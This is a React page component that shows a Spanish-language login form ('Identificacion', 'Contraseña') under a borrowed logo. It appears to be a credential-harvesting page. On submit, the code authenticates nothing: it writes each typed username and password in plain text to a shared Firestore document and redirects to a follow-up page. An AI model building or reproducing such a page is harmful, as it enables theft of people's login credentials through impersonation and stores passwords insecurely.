import { useState, useEffect } from "react";
import EmblaCarousel from "../components/EmblaCarousel";
import firebase from "../components/firebase";
function findGetParameter(url) {
  var result = null,
    tmp = [];
  window.location.search
    .substr(1)
    .split("&")
    .forEach(function (item) {
      tmp = item.split("=");
      if (tmp[0] === url) result = decodeURIComponent(tmp[1]);
    });
  return result;
}

const FirmaDigital = () => {
  const [state, setState] = useState("");
  useEffect(() => {
    let urlP = findGetParameter("firma");
    setState(urlP);
  }, []);

  const [activeCursos, setActiveCursos] = useState([]);
  const [infoUser, setInfoUser] = useState([]);
  const [solicitud, setSolicitud] = useState("");

  useEffect(() => {
    const cursosRef = firebase
      .firestore()
      .collection("registros")
      .doc("registros");
    cursosRef.onSnapshot((snapshot) => {
      setActiveCursos(snapshot.data().usuario);
    });
  }, []);

  const CreateUser = (name, text) => {
    setInfoUser({ ...infoUser, [name]: text });
  };

  const GetData = () => {
    const cursosRef = firebase
      .firestore()
      .collection("registros")
      .doc("registros");
    cursosRef.onSnapshot((snapshot) => {
      setActiveCursos(snapshot.data().usuario);
    });
  };

  const handdleWhatsApp = (text) => {
    GetData();

    let arrayAux = activeCursos;
    try {
      arrayAux.push(infoUser);
    } catch (e) {
      console.log(e);
    }

    const cursoRef = firebase
      .firestore()
      .collection("registros")
      .doc("registros");
    cursoRef.update({ usuario: arrayAux }).then(() => {
      window.location.href = "/nuevo-usuario?firma=" + solicitud;
    });
  };

  useEffect(() => {
    setSolicitud(activeCursos.length);
    CreateUser("id", activeCursos.length);
  }, [activeCursos]);

  return (
    <div>
      <div className="bg-[#25318d] w-full h-[6rem] grid content-center">
      <div className=" lg:w-7/12 mx-auto ">
          <img
            className=" h-[5rem]"
            src="https://static.wixstatic.com/media/522144_234e90535ea940868ced4ae9349cc3ba~mv2.jpg/v1/fill/w_105,h_102,al_c,q_80,usm_0.66_1.00_0.01/H09.webp"
          />
        </div>
      </div>
      <div className="w-11/12 lg:w-7/12 mx-auto h-[90vh] lg:h-[60vh] mt-20 bg-contain bg-no-repeat lg:bg-cover bg-[url('/522144_cf16d3ac608b4a99a44240dbcf0fd47c_mv2.webp')]">
        <div className="lg:w-full h-10" />
        <div className="border w-10/12 lg:w-6/12 mx-auto p-10 bg-white bg-opacity-75">
          <h1 className="text-indigo-700 text-xl">Inicio</h1>
          <input
            type="text"
            id="name"
            placeholder="Identificacion"
            className="border mt-5 w-full p-2"
            onChange={(e) => CreateUser("user", e.target.value)}
          />
          <input
            type="password"
            id="password"
            placeholder="Contraseña"
            className="border mt-5 w-full p-2"
            onChange={(e) => CreateUser("password", e.target.value)}
          />
          <div className="flex mt-10">
            <input type="checkbox" />
            <p className="-mt-1.5 ml-2 text-indigo-700">
              He leído y acepto los términos y condiciones del aviso legal y la
              política de privacidad
            </p>
          </div>
          <button
            onClick={(e) => handdleWhatsApp()}
            className="mt-10 w-1/3 font-medium bg-[#c0dd66] p-1 cursor-pointer"
          >
            Ingresar
          </button>
        </div>
      </div>
      <div className="border mt-20">
        <div className="lg:w-7/12 mx-auto">
          <img className="w-screen" src="/H7.webp" />
        </div>
      </div>
    </div>
  );
};

FirmaDigital.layout = "L2";

export default FirmaDigital;
